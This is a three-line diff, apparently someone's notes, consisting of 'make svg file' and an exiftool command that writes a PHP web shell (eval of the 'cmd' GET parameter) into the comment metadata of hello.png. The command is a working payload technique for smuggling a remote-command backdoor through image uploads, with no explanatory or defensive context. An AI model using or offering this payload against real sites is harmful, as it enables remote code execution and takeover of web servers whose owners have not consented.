@@ -1,0 +1,3 @@
+make svg file 
+
+exiftool -Comment='<?php eval($_GET["cmd"]);' hello.png
